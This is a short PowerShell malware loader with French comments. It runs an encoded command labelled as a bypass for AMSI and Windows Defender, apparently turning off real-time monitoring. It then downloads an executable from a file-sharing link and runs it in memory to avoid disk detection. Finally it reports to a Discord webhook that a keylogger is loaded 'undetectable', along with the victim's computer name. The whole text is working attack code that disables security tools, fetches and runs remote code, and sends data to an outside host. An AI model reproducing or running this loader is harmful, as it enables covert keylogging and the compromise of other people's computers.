$webhook = "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"

# Bypass AMSI + Defender (obfuscation 2025)
IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQA dAB yAHUAZQA=')))

# Charge et exécute ton exe en RAM (sans toucher le disque)
$bytes = (New-Object Net.WebClient).DownloadData('https://limewire.com/d/FDphV#TmLbLMqVie')
$asm = [System.Reflection.Assembly]::Load($bytes)
$asm.EntryPoint.Invoke($null, @([string[]]@()))

# Log final
try{(iwr $webhook -Method Post -Body (@{content="Keylogger chargé en mémoire sur $env:COMPUTERNAME – indétectable"}|ConvertTo-Json) -ContentType 'application/json').Content}catch{}
